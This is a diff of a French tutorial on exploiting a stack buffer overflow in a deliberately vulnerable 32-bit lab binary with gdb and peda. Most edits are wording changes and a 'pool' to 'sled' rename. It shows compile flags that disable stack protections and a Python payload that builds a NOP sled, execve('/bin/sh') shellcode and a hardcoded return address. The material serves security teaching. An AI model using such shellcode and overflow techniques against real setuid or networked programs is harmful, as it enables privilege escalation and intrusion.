@@ -189,16 +189,16 @@ Pour cela, si ce n&rsquo;est déjà fait, je vous invite à lire mon article &ld
 
 <h2 id="quel-est-le-principe-d-un-buffer-overflow">Quel est le principe d&rsquo;un &ldquo;buffer overflow&rdquo; ?</h2>
 
-<p>Avant de parler du &ldquo;overflow&rdquo;, nous allons déjà parler du &ldquo;buffer&rdquo;.<br />
-Un &ldquo;buffer&rdquo; en programmation est une mémoire-tampon permettant de stocker temporairement des données (chaîne de caractères, un fichier&hellip;) avant d&rsquo;être utilisées ou simplement copiée dans une autre zone mémoire. Par exemple, quand vous entrez du texte dans un programme, votre texte est placé temporairement dans un buffer (mémoire-tampon) et ensuite l&rsquo;adresse du buffer peut être envoyée à une fonction d&rsquo;impression pour l&rsquo;afficher à l&rsquo;écran.</p>
+<p>Avant de parler de l&rsquo;overflow, nous allons déjà parler du &ldquo;buffer&rdquo;.<br />
+Un &ldquo;buffer&rdquo; en programmation est une mémoire-tampon permettant de stocker temporairement des données (chaîne de caractères, contenu d&rsquo;un fichier&hellip;) avant d&rsquo;être utilisées ou simplement copiées dans une autre zone mémoire. Par exemple, quand vous entrez du texte dans un programme, votre texte est placé temporairement dans un buffer (mémoire-tampon) et ensuite l&rsquo;adresse du buffer peut être envoyée à une fonction d&rsquo;affichage.</p>
 
 <p><img src="/img/buffer.jpg" alt="buffer" /></p>
 
 <p><strong><em>Mais&hellip; c&rsquo;est quoi ce truc à la fin de mon buffer ?</em></strong><br />
-&ldquo;\x00&rdquo;, ça ? <strong>le null byte de fin de chaîne</strong>, et le &ldquo;\x&rdquo; permet d&rsquo;indiquer une valeur he<strong>x</strong>adécimale. Cet octet nul sert tout simplement à indiquer que c&rsquo;est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s&rsquo;arrêter de lire en mémoire. La fonction d&rsquo;impression l&rsquo;a utilisée pour afficher le texte &ldquo;Julien&rdquo; à l&rsquo;écran. Sans ce caractère nul, la fonction serait incapable de savoir quand est la fin du texte et elle continuerait à lire la suite.</p>
+&ldquo;\x00&rdquo;, ça ? <strong>le null byte de fin de chaîne</strong>, et le &ldquo;\x&rdquo; permet d&rsquo;indiquer une valeur he<strong>x</strong>adécimale. Cet octet nul sert tout simplement à indiquer que c&rsquo;est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s&rsquo;arrêter de lire en mémoire. La fonction d&rsquo;impression l&rsquo;a utilisée pour afficher le texte &ldquo;Julien&rdquo; à l&rsquo;écran. Sans ce caractère nul, la fonction serait incapable de savoir où se situe la fin du texte et elle continuerait à lire la suite.</p>
 
-<p>Et voilà&hellip;.. Ah oui, j&rsquo;ai failli oublier! Le &ldquo;overflow&rdquo; maintenant :)<br />
-&ldquo;Overflow&rdquo; c&rsquo;est le fait de déborder ce buffer et d&rsquo;aller écrire en dehors de l&rsquo;espace réservé à la base. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l&rsquo;application !</p>
+<p>Et voilà&hellip;.. Ah oui, j&rsquo;ai failli oublier! L&rsquo;overflow maintenant :)<br />
+&ldquo;Overflow&rdquo; c&rsquo;est le fait de déborder de ce buffer et d&rsquo;aller écrire en dehors de l&rsquo;espace initialement prévu. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l&rsquo;application !</p>
 
 <p><img src="/img/overflow.jpg" alt="overflow" /></p>
 
@@ -213,25 +213,25 @@ L&rsquo;objectif c&rsquo;est de dévier le flux d&rsquo;exécution du programme 
 <p><strong><em>Je ferme l&rsquo;application et j&rsquo;exécute directement les commandes que je veux, pourquoi s&rsquo;embêter ?</em></strong><br />
 Parce que vous n&rsquo;avez pas forcément les droits nécessaires :p Sur une machine, il y a des services qui peuvent tourner avec des privilèges élevés ou alors des binaires possédant le flag &ldquo;suid&rdquo; et là prendre le contrôle d&rsquo;une telle application devient nettement plus intéressant.</p>
 
-<p>Le flag &ldquo;suid&rdquo; pour &ldquo;Set User ID&rdquo;, est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s&rsquo;agit d&rsquo;un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l&rsquo;utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires et le flag &ldquo;suid&rdquo; peut être la solution.</p>
+<p>Quelques exemples motivant un attaquant à exploiter un buffer overflow :</p>
+
+<ul>
+<li>Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d&rsquo;exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d&rsquo;obtenir un reverse shell (un shell qui vient se conecter sur la machine de l&rsquo;attaquant).</li>
+<li>Cette fois, l&rsquo;attaquant à la main sur la machine mais possède des privilèges limités. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d&rsquo;obtenir un shell possédant les pleins pouvoirs.</li>
+<li>Maintenant aucun service n&rsquo;est vulnérable et l&rsquo;attaquant n&rsquo;a pas la main sur la machine. Dans un premier temps, il va utiliser de l&rsquo;ingénierie sociale (manipulation de l&rsquo;être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l&rsquo;un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique&hellip;) et l&rsquo;attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).</li>
+</ul>
+
+<p>Le flag &ldquo;suid&rdquo; pour &ldquo;Set User ID&rdquo;, est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s&rsquo;agit d&rsquo;un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l&rsquo;utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires. Par exemple, l&rsquo;utilitaire &ldquo;ping&rdquo; nécessite des privilèges élevés pour ouvrir un socket réseau.</p>
 
 <p><img src="/img/suid.jpg" alt="suid" /></p>
 
 <p>Pour vérifier si un fichier possède le bit &ldquo;suid&rdquo;, il suffit simplement d&rsquo;afficher les permissions du fichier et de regarder s&rsquo;il ne possède pas la permission &ldquo;s&rdquo; à la place du &ldquo;x&rdquo;. Si c&rsquo;est le cas, alors le fichier sera exécuté avec les permissions du propriétaire. De plus, quand c&rsquo;est le cas le nom du fichier apparaîtra sur fond rouge (comme sur ma capture, mais cela va dépendre de votre distribution).</p>
 
-<p>Quelques exemples motivant un attaquant à exploiter un buffer overflow :</p>
-
-<ul>
-<li>Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d&rsquo;exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d&rsquo;obtenir un reverse shell (un shell inversé).</li>
-<li>Cette fois, l&rsquo;attaquant à la main sur la machine mais ne possède pas les pleins pouvoirs. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d&rsquo;obtenir un shell possédant les pleins pouvoirs.</li>
-<li>Maintenant aucun service n&rsquo;est vulnérable et l&rsquo;attaquant n&rsquo;a pas la main sur la machine. Dans un premier temps, il va utiliser de l&rsquo;ingénierie sociale (manipulation de l&rsquo;être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l&rsquo;un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique&hellip;) et l&rsquo;attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).</li>
-</ul>
-
 <p>Vous voyez qu&rsquo;il y a un intérêt à exploiter un buffer overflow :) Let&rsquo;s go ??</p>
 
 <h2 id="l-utilisation-d-un-débogueur">L&rsquo;utilisation d&rsquo;un débogueur</h2>
 
-<p>Avant de commencer à décortiquer notre programme, nous avons besoin d&rsquo;un débogueur. Cette chose-là permet d&rsquo;analyser les bugs d&rsquo;un programme. Pour ça, il est capable d&rsquo;exécuter le programme pas-à-pas (ligne par ligne), d&rsquo;afficher la valeur des variables, de mettre des points d&rsquo;arrêt à des endroits stratégiques du programme&hellip; Ça permet réellement d&rsquo;analyser et contrôler l&rsquo;exécution du programme souhaité et ainsi en comprendre son fonctionnement sans être en possession du code source.</p>
+<p>Avant de commencer à décortiquer notre application, nous avons besoin d&rsquo;un débogueur. C&rsquo;est un logiciel qui permet d&rsquo;analyser un programme pour trouver des bugs. Pour ça, il est capable d&rsquo;exécuter le programme pas-à-pas (instruction par instruction), d&rsquo;afficher la valeur des variables, de mettre des points d&rsquo;arrêt à des endroits stratégiques du programme&hellip; Ça permet d&rsquo;analyser et contrôler l&rsquo;exécution du programme souhaité et ainsi en comprendre son fonctionnement sans être en possession du code source.</p>
 
 <p>Nous allons utliser <strong>le débogueur GDB (GNU Debugger)</strong> qui est le débogueur standard du projet GNU. Il fonctionne sur de nombreuses architectures de processeur, permet le débogage à distance (via une connexion série ou IP) et fonctionne sur de nombreux systèmes Unix.<br />
 L&rsquo;interface graphique ? une simple console :) Vous allez voir que c&rsquo;est sympa (ce n&rsquo;est pas de l&rsquo;ironie) ! On va juste devoir rajouter un petit quelque chose sur GDB pour le rendre plus accueillant.</p>
@@ -240,16 +240,13 @@ L&rsquo;interface graphique ? une simple console :) Vous allez voir que c&rsquo;
 
 <p>GDB est disponible dans la plupart des dépôts sous le nom de paquet &ldquo;gdb&rdquo;. Commencez donc par l&rsquo;installer :</p>
 
-<pre><code># Debian
-sudo apt-get install gdb
-
-# CentOS
-sudo yum install gdb
+<pre><code>sudo apt-get install gdb
 </code></pre>
 
 <p>De base, GDB n&rsquo;est pas très pratique à utiliser. Une commande doit être tapée à chaque fois pour suivre l&rsquo;exécution du programme, visualiser les registres, la pile, aucune couleur permettant de mettre en évidence les relations, etc&hellip;</p>
 
-<p>Mais heureusement, il existe des extensions à GDB permettant de rajouter toutes ces choses-là, des commandes supplémentaires et bien plus encore ! Ici, nous allons utiliser &ldquo;peda&rdquo; pour sa simplicité et son ergonomie. Si vous avez eu l&rsquo;occasion de suivre mon premier tuto sur l&rsquo;app-système alors &ldquo;peda&rdquo; vous dira quelque chose. Pour l&rsquo;installer, rien de plus simple :</p>
+<p>Mais heureusement, il existe des extensions à GDB permettant de rajouter toutes ces choses-là, des commandes supplémentaires et bien plus encore ! Ici, nous allons utiliser &ldquo;peda&rdquo; pour sa simplicité et son ergonomie.<br />
+Pour l&rsquo;installer, rien de plus simple :</p>
 
 <pre><code>git clone https://github.com/longld/peda.git ~/peda
 echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
@@ -294,7 +291,7 @@ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
 </tr>
 
 <tr>
-<td><code>display/[quantité][type]x *0x...</code></td>
+<td><code>display/[quantité][type] *0x...</code></td>
 <td>x/&hellip;</td>
 <td>Affiche une zone mémoire à partir de son adresse ou du nom d&rsquo;une fonction. Type : &lsquo;w&rsquo; 32 bits, &lsquo;b&rsquo; 8 bits&hellip;</td>
 </tr>
@@ -344,7 +341,8 @@ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
 </table>
 
 <p>Pour avoir la liste complète des commandes, les différents types d&rsquo;affichages, etc&hellip; c&rsquo;est par ici :<br />
-<a href="https://sourceware.org/gdb/onlinedocs/gdb/">https://sourceware.org/gdb/onlinedocs/gdb/</a></p>
+<a href="https://sourceware.org/gdb/onlinedocs/gdb/">https://sourceware.org/gdb/onlinedocs/gdb/</a> <br />
+<a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
 
 <p><strong><em>Tips : vous pouvez réexécuter la dernière commande exécutée en tapant simplement sur [Entrée].</em></strong></p>
 
@@ -356,15 +354,16 @@ Vous pouvez le télécharger <a href="/binary/overflow">ici</a>.</p>
 <p>Je ne vous donne volontairement pas le code source tout simplement parce que dans une situation réelle, vous ne l&rsquo;avez pas forcément :)<br />
 En revanche, voici la commande qui a permis de compiler le programme :</p>
 
-<pre><code>gcc overflow.c -o overflow -fno-stack-protector -z execstack -m32
+<pre><code>gcc overflow.c -o overflow -fno-stack-protector -z execstack -no-pie -m32
 </code></pre>
 
 <p>Voici à quoi servent les différents arguments :</p>
 
 <ul>
 <li>-o <strong>[fichier]</strong> : place la sortie dans le fichier <strong>[fichier]</strong></li>
-<li>-fno-stack-protector : permets de désactiver la protection de la pile. Dans les dernières versions de GDB, cette option est activée par défaut. Pour exploiter notre buffer overflow sur la pile, c&rsquo;est mieux de la désactiver :)</li>
+<li>-fno-stack-protector : permets de désactiver la protection de la pile. Dans les dernières versions de gcc, cette option est activée par défaut. Pour exploiter notre buffer overflow sur la pile, c&rsquo;est mieux de la désactiver :)</li>
 <li>-z execstack : permets de rendre la pile exécutable. Vous allez comprendre pourquoi nous avons besoin de cette option par la suite.</li>
+<li>-no-pie : permets de désactiver la randomisation des espaces d&rsquo;adresses du code exécutable existant.</li>
 <li>-m32 : permets de compiler le code source en 32 bits. Les adresses seront moins longues comme ça.</li>
 </ul>
 
@@ -390,11 +389,7 @@ bash: ./overflow: No such file or directory
 On va arranger ça. Je pourrais parier que vous avez un OS en 64 bits, non ?<br />
 Pour que votre OS puisse exécuter des binaires en 32 bits, il vous faut la bibliothèque standard C++ en version 32 bits. Pour l&rsquo;obtenir, installez simplement ce paquet :</p>
 
-<pre><code># Debian
-sudo apt-get install lib32stdc++6
-
-# CentOS
-sudo yum install libstdc++.i686
+<pre><code>sudo apt-get install lib32stdc++6
 </code></pre>
 
 <p>Ça fonctionne ? Parfait, nous allons pouvoir passer à la suite.</p>
@@ -443,7 +438,7 @@ Nous allons lister les fonctions présentes afin d&rsquo;y voir plus clair :</p>
 <p><img src="/img/gdb_functions.jpg" alt="gdb_functions" /></p>
 
 <p><strong><em>Mais&hellip; il y en a beaucoup pour un simple programme !</em></strong><br />
-Toutes les fonctions commençant par un underscore ou finissants par &ldquo;@plt&rdquo; ne sont souvent pas des fonctions développées par le développeur du programme. C&rsquo;est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d&rsquo;initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions &ldquo;&hellip;register&hellip;clones&rdquo; et &ldquo;frame_dummy&rdquo; peuvent également être ignorées.<br />
+Toutes les fonctions commençant par un underscore ou finissants par &ldquo;@plt&rdquo; ne sont souvent pas des fonctions développées par le développeur. C&rsquo;est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d&rsquo;initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions &ldquo;&hellip;register&hellip;clones&rdquo; et &ldquo;frame_dummy&rdquo; peuvent également être ignorées.<br />
 Bon allez, voici une commande permettant d&rsquo;afficher uniquement les fonctions ne commençant pas par un underscore et ne possédant pas de &ldquo;@&rdquo; :</p>
 
 <p><img src="/img/gdb_functions_filter.jpg" alt="gdb_functions_filter" /></p>
@@ -530,10 +525,10 @@ Le shellcode a été trouvé sur <a href="http://shell-storm.org/shellcode/">she
 
 <p>Ce code va donc effectuer l&rsquo;appel système <strong>execve</strong> qui permet d&rsquo;exécuter un programme (pour nous /bin/sh). En langage C, cela donnerait :</p>
 
-<pre><code>execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;]);
+<pre><code>execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;], 0);
 </code></pre>
 
-<p>Les informations nécessaires pour réaliser un syscall peuvent être trouvées ici : <a href="https://w3challs.com/syscalls/?arch=x86">https://w3challs.com/syscalls/?arch=x86</a></p>
+<p>Les informations nécessaires pour réaliser un syscall (convention 32 bits) peuvent être trouvées ici : <a href="https://w3challs.com/syscalls/?arch=x86">https://w3challs.com/syscalls/?arch=x86</a></p>
 
 <h3 id="écriture-de-l-exploit">Écriture de l&rsquo;exploit</h3>
 
@@ -554,14 +549,14 @@ On va rajouter 18 instructions &ldquo;nop&rdquo; (ne fait aucune action) avant n
 <p>En Python, cela donnerait :</p>
 
 <p><code>
-print &quot;\x90&quot;*18 + &quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;pool_address&quot;
+print &quot;\x90&quot;*18 + &quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;sled_address&quot;
 </code></p>
 
-<p>Pour calculer l&rsquo;adresse du pool, il suffit simplement de récupérer l&rsquo;adresse du haut de la pile au moment du &ldquo;ret&rdquo; et d&rsquo;enlever 44 (0x2c).</p>
+<p>Pour calculer l&rsquo;adresse du sled, il suffit simplement de récupérer l&rsquo;adresse du haut de la pile au moment du &ldquo;ret&rdquo; et d&rsquo;enlever 44 (0x2c).</p>
 
-<p><img src="/img/overflow_pool_address.jpg" alt="overflow pool address" /></p>
+<p><img src="/img/overflow_sled_address.jpg" alt="overflow sled address" /></p>
 
-<p>Pour être tranquille, je ne vais pas prendre exactement le début du pool mais un peu après. Ma charge finale donne donc :</p>
+<p>Pour être tranquille, je ne vais pas prendre exactement le début du sled mais un peu après. Ma charge finale donne donc :</p>
 
 <p><code>
 print &quot;\x90&quot;*18 + &quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;\xf5\xc4\xff\xff&quot;
@@ -577,7 +572,7 @@ gdb-peda$ r &lt; &lt;(python -c 'print &quot;\x90&quot;*18 + &quot;\x83\xC4\x32\
 
 <p>Félicitations à vous !</p>
 
-<p><strong><em>Je n&rsquo;ai pas compris pourquoi nous avions dû inverser l&rsquo;ordre des octets pour l&rsquo;adresse du pool&hellip;</em></strong><br />
+<p><strong><em>Je n&rsquo;ai pas compris pourquoi nous avions dû inverser l&rsquo;ordre des octets pour l&rsquo;adresse du sled&hellip;</em></strong><br />
 Effectivement, je n&rsquo;ai pas donné d&rsquo;explication sur cette inversion. En informatique, il y a deux façons d&rsquo;écrire une adresse et on appelle cela l&rsquo;<a href="https://fr.wikipedia.org/wiki/Endianness">endianness</a>. Les architectures de processeurs utilisent l&rsquo;une ou l&rsquo;autre :</p>
 
 <ul>
